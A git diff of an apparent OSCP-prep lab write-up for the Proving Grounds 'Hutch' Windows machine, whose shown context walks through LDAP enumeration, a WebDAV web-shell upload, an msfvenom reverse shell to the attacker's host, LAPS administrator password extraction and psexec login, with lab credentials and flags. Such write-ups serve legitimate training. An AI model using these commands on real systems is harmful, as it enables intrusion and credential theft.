@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-28
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Windows
 Difficulty: Intermediate
@@ -102,7 +103,7 @@ Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
 	- https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228
 ## Port 80 - HTTP (Microsoft IIS)
 - Navigated to `http://192.168.171.122:80` and identified default page for `Microsoft IIS` service
-![[Pasted image 20241027170248.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027170248.png]]
 ## Port 88 -  Kerberos (Microsoft Windows Kerberos)
 No enumeration conducted
 ## Port 135 - MSRPC (Windows RPC)
@@ -111,10 +112,10 @@ No enumeration conducted
 No enumeration conducted
 ## Port 389 & 3268/9 - LDAP (Microsoft Windows Active Directory)
 - Ran `sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.171.122` to identify potenial scripts for LDAP - identified Domain Name `hutch.offsec`
-![[Pasted image 20241027175147.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027175147.png]]
 - Ran `ldapsearch -v -x -b 'DC=hutch,DC=offsec' -H 'ldap://192.168.171.122' '(objectclass=*)'` to identify users
 - Identified clear text credentials for `fmcsorley:CrabSharkJellyfish192` in user description
-![[Pasted image 20241027175717.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027175717.png]]
 ## Port 464 - Kerberos (Password Change)
 No enumeration conducted
 ## Port 593 - ncacn_http
@@ -123,7 +124,7 @@ No enumeration conducted
 No enumeration conducted
 ## Port 5985 - http (Microsoft HTTPAPI httpd 2.0)
 - Navigated to `192.168.171.122:5985` and identified `404 Not Found` page
-![[Pasted image 20241027172925.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027172925.png]]
 ## Ports 49666/8, 49674/6, 49692, 49756,  - MSRPC (Windows RPC)
 
 ---
@@ -131,26 +132,26 @@ No enumeration conducted
 ## Malicious File Upload
 - Ran `cadaver http://192.168.171.122` & logged in with credentials `fmcsorley:CrabSharkJellyfish192` to access `WebDav`
 - Ran `put /usr/share/webshells/aspx/cmdasp.aspx` to upload command web shell
-![[Pasted image 20241027181048.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027181048.png]]
 - Navigated to `http://192.168.171.122/cmdasp.aspx` to confirm upload and test command execution
-![[Pasted image 20241027181112.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027181112.png]]
 - Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=4444 -f exe > revshell2.exe` to create reverse shell executable
-![[Pasted image 20241027181332.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027181332.png]]
 - Returned to `Cadaver` login and ran `/media/sf_Kali-Shared/Boxes/PG/Windows/Hutch/revshell2.exe` to upload to web server
-![[Pasted image 20241027181541.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241027181541.png]]
 - Started netcat listener on port `4444`, returned to web browser to execute `C:\inetpub\wwwroot\revshell2.exe` command, and caught reverse shell
-![[Pasted image 20241028194223.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028194223.png]]
 - Ran `type C:\Users\fmcsorley\local.txt` to print `22d03ac1b79145247627d9e068667178`
-![[Pasted image 20241028202217.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028202217.png]]
 ---
 # Privilege Escalation
 ## Psexe.py
 - Ran `ldapsearch -x -H 'ldap://192.168.182.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd` to find administrator password `administrator:c)!ybbH7AN58p1`
-![[Pasted image 20241028194935.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028194935.png]]
 - Ran `/usr/share/doc/python3-impacket/examples/psexec.py hutch.offsec/administrator:'c)!ybbH7AN58p1'@192.168.182.122` to login with psexec.py
-![[Pasted image 20241028201233.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028201233.png]]
 - Ran `type C:\Users\Administrator\Desktop\proof.txt` to print `efd8e0e27039c18caf863001955304b3`
-![[Pasted image 20241028202150.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028202150.png]]
 ---
 # Trophy & Loot
 `local.txt` = `22d03ac1b79145247627d9e068667178`
